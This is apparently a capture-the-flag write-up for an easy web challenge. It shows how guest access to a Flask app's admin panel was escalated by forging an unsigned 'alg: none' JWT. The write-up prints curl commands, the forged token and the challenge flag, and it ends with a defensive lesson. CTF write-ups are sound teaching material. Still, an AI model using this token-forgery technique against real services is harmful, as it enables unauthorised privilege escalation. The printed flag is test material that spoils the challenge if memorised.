# Admin Portal

## Challenge info

- **Name:** Admin Portal
- **Category:** Web
- **Difficulty:** Easy / Intermediate
- **Target:** `66.228.54.80:8989`

The challenge provides a small Flask application with guest login access and a protected admin panel.

The goal is straightforward: find a way to make the application treat a guest session as an administrator session.

## First look

The site allows users to log in as a guest and access a normal dashboard. An admin link is visible in the navigation bar, but visiting `/admin` with a regular guest session returns:

```text
403 Forbidden
```

I started by reviewing a HAR capture containing requests to the homepage, login page, dashboard, and admin endpoint.

The capture did not show any cookies, which was initially suspicious, but this turned out to be a limitation of the capture rather than the application itself.

To inspect the login flow directly, I sent the request using `curl`:

```bash
curl -c cookies.txt -b cookies.txt \
  -d "username=guest" \
  http://66.228.54.80:8989/login \
  -L -v
```

After logging in, the server returned a cookie named:

```text
session
```

No password was required. The application only asked for a username and created a guest session immediately.

## Inspecting the session token

The session cookie contained three Base64URL-encoded sections separated by periods, which made it look like a JSON Web Token.

Decoding the first two sections revealed the following header:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

The payload contained:

```json
{
  "user": "guest",
  "role": "user"
}
```

The important field was:

```json
"role": "user"
```

The `/admin` endpoint was most likely checking whether the token contained an administrator role.

Changing the payload to `"role": "admin"` would normally invalidate the token because an HS256 JWT includes a signature calculated using a server-side secret.

However, the application appeared to be using a custom or incorrectly configured JWT implementation, so I tested whether it accepted unsigned tokens.

## The `alg: none` vulnerability

A JWT header declares the algorithm used to protect the token.

Secure implementations must configure the expected algorithm on the server and reject anything else. Vulnerable implementations may trust the algorithm supplied inside the token itself.

If the server accepts:

```json
"alg": "none"
```

it may treat the JWT as unsigned and skip signature verification completely.

I created a new header:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Then I changed the payload role to administrator:

```json
{
  "user": "guest",
  "role": "admin"
}
```

After Base64URL-encoding both sections, I joined them with periods and left the signature section empty.

The forged token was:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ.
```

The trailing period is important because it represents the empty signature section.

## Exploitation

I sent a request to the admin endpoint using the forged token as the `session` cookie:

```bash
curl \
  -H "Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ." \
  http://66.228.54.80:8989/admin
```

The server accepted the unsigned token and trusted the modified role.

It returned:

```text
Access granted. Welcome, administrator guest.
bdsec{n0ne_4lg_m34ns_n0_s1gn4tur3}
```

No signing key, brute force, or secret recovery was required. The application simply skipped signature verification because the token declared that no signing algorithm was being used.

## Flag

```text
bdsec{n0ne_4lg_m34ns_n0_s1gn4tur3}
```

## Final thoughts

This was a classic JWT algorithm-confusion challenge.

The application trusted the `alg` value provided by the client instead of enforcing an expected algorithm during verification. By changing the algorithm to `none`, removing the signature, and setting the role to `admin`, it was possible to forge a fully privileged session.

The important defensive lesson is that a server should never let an untrusted token decide how it will be verified. The expected algorithm must be configured explicitly, and unsigned tokens should always be rejected.
